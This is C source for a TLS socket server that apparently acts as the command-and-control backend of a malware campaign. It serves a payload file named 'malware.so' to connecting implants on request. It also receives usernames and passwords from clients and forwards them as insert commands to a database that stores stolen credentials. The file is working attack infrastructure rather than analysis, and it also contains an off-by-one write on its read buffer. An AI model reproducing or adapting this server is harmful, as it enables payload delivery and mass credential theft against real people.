#include <openssl/crypto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include "server.h"
#include <stdarg.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

struct sockaddr_in addr;
struct sockaddr_in client_addr;

void printLog(char *msg, ...) {
  printf("\33[2K\r"); 
  time_t now = time(NULL);
  struct tm *tm_info = localtime(&now);
  char time_str[9];
  strftime(time_str, sizeof(time_str), "%H:%M:%S", tm_info);

  va_list args;
  va_start(args, msg);
  printf("[server] [%s] ", time_str);
  vprintf(msg, args);
  va_end(args);
  printf("\n[server] interact > ");
  fflush(stdout);
}

void *handleClient(void *arg) {
  infoclient *client = (infoclient *)arg;
  if (!client) {
    fprintf(stderr, "[server] [error] client is NULL\n");
    return NULL;
  }

  printLog("New connection from %s (id: %d)", client->ip, client->client);

  while (1) {
    char buffer[512];
    memset(buffer, 0, sizeof(buffer));
    int len = SSL_read(client->ssl, buffer, sizeof(buffer));
    if (len <= 0) {
      printLog("Connection closed by %s (id: %d)", client->ip, client->client);
      goto cleanup;
    }

    buffer[len] = '\0';
    buffer[strcspn(buffer, "\r\n")] = '\0';

    printLog("Received from %s: %s", client->ip, buffer);

    char *saveTOK;
    char *clientinput = strtok_r(buffer, " ", &saveTOK);

    if (clientinput && strncmp(clientinput, DOWNLOAD_COMMAND, strlen(DOWNLOAD_COMMAND)) == 0) {
      if (strtok_r(NULL, " ", &saveTOK) != NULL) {
        printLog("Too many arguments from %s", client->ip);
        goto cleanup;
      }

      FILE *file = fopen("malware.so", "rb");
      if (!file) {
        printLog("Failed to open malware.so for %s", client->ip);
        SSL_write(client->ssl, "failed\n", 7);
        goto cleanup;
      }

      char fileBuffer[CHUNK_SIZE];
      size_t bytesRead;

      while ((bytesRead = fread(fileBuffer, 1, sizeof(fileBuffer), file)) > 0) {
        if (SSL_write(client->ssl, fileBuffer, bytesRead) <= 0) {
          printLog("Failed to send file to %s", client->ip);
          break;
        }
      }

      printLog("File sent to %s", client->ip);
      fclose(file);
      goto cleanup;
    }

    if (!clientinput || strncmp(clientinput, API_COMMAND, strlen(API_COMMAND)) != 0) {
      printLog("Invalid or missing command from %s", client->ip);
      continue;
    }

    malwareRetrieve current = {0};
    clientinput = strtok_r(NULL, " ", &saveTOK);
    if (!clientinput) {
      printLog("Missing username from %s", client->ip);
      continue;
    }
    strncpy(current.username, clientinput, sizeof(current.username) - 1);

    clientinput = strtok_r(NULL, " ", &saveTOK);
    if (!clientinput) {
      printLog("Missing password from %s", client->ip);
      continue;
    }
    if (strtok_r(NULL, " ", &saveTOK)) {
      printLog("Too many arguments from %s", client->ip);
      continue;
    }

    strncpy(current.password, clientinput, sizeof(current.password) - 1);
    strncpy(current.ipaddr, client->ip, sizeof(current.ipaddr) - 1);

    ssize_t size = strlen(current.username) + strlen(current.password) + 16;
    char *stringtosend = malloc(size);
    snprintf(stringtosend, size, "insert %s %s", current.username, current.password);
    sendToDatabase(stringtosend);
    free(stringtosend);    

    continue;
  }

cleanup:
  printLog("Closing connection with %s (id: %d)", client->ip, client->client);
  if (client->ssl) {
    SSL_shutdown(client->ssl);
    SSL_free(client->ssl);
  }
  if (client->client >= 0)
    close(client->client);
  free(client);
  return NULL;
}

void *ListenToClient(void *arg) {
  context *fullcontext = (context *)arg;
  printLog("Server ready. Waiting for connections...");

  while (1) {
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int newsocket = accept(fullcontext->fd, (struct sockaddr *)&client_addr, &client_len);
    if (newsocket == -1) {
      printLog("Error accepting new client");
      exit(1);
    }

    infoclient *client = malloc(sizeof(infoclient));
    if (client == NULL) {
      printLog("Failed to allocate memory for new client");
      exit(1);
    }
    client->client = newsocket;
    client->ssl = SSL_new(fullcontext->ctx);
    if (!client->ssl) {
      printLog("SSL_new failed for new client");
      exit(1);
    }

    if (SSL_set_fd(client->ssl, client->client) != 1) {
      printLog("SSL_set_fd failed");
      exit(-1);
    }

    int ret = SSL_accept(client->ssl);
    if (ret <= 0) {
      printLog("SSL_accept failed");
      close(client->client);
      SSL_free(client->ssl);
      free(client);
      continue;
    }

    inet_ntop(AF_INET, &client_addr.sin_addr, client->ip, sizeof(client->ip));
    pthread_t newthread;
    if (pthread_create(&newthread, NULL, handleClient, client) != 0) {
      printLog("Failed to create thread for client");
      exit(-1);
    }
    pthread_detach(newthread);
  }
}
